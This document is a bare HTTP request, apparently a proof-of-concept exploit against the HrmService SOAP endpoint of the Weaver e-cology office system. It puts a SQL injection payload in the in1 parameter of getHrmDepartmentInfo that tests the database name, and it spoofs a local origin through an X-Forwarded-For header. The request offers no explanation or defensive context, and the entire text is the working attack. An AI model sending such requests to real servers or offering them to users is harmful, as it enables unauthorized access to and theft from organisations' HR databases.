```
POST /services/HrmService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close
SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 427
X-Forwarded-For: 127.0.0.1

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
<soapenv:Header/>
<soapenv:Body>
<hrm:getHrmDepartmentInfo>
<!--type: string-->
<hrm:in0>gero et</hrm:in0>
<!--type: string-->
<hrm:in1>1)AND(db_name()like'ec%'</hrm:in1>
</hrm:getHrmDepartmentInfo>
</soapenv:Body>
</soapenv:Envelope>
```

